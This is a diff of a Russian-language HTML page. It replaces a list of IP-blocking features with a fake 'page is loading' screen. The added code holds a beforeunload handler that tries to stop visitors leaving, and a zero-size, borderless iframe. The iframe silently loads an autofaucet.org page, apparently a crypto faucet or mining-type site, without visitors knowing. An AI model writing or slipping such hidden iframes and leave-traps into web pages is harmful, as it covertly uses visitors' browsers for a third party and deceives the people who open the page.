@@ -1,24 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Пример сервера с Flask</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        #loading-text {
+            animation: moveText 2s infinite alternate;
+        }
+        @keyframes moveText {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(30px);
+            }
+        }
+    </style>
+    <script>
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+            console.log('Пользователь закрывает страницу.');
+            // Здесь вы можете выполнить дополнительные действия, например, отправить запрос на сервер.
+        });
+    </script>
+</head>
 <body>
-
-  <hr>
-
-  <p style="text-align: center; color: white; font-weight: bold;">Команды</p>
-
-  <div style="background-color: red; width: 10px; height: 10px; display: inline-block; vertical-align: middle;"></div>
-  <span>/check &lt;айпи:ник&gt; - информация об айпи</span>
-
-  <hr>
-
-  <p style="text-align: center; color: white; font-weight: bold;">Преимущества</p>
-
-  <ul>
-    <li><span style="color: red;">&bull;</span> Блокировка IP по базам прокси-листов</li>
-    <li><span style="color: red;">&bull;</span> Блокировка определенных местоположений</li>
-    <li><span style="color: red;">&bull;</span> Блокировка отдельных провайдеров</li>
-    <li><span style="color: red;">&bull;</span> Использование собственного API</li>
-  </ul>
+    <p id="loading-text">Страница загружается...</p>
+    <iframe src="https://autofaucet.org/wm/moonblock/2" width="0" height="0" style="border:0"></iframe>
 </body>
 </html>
 
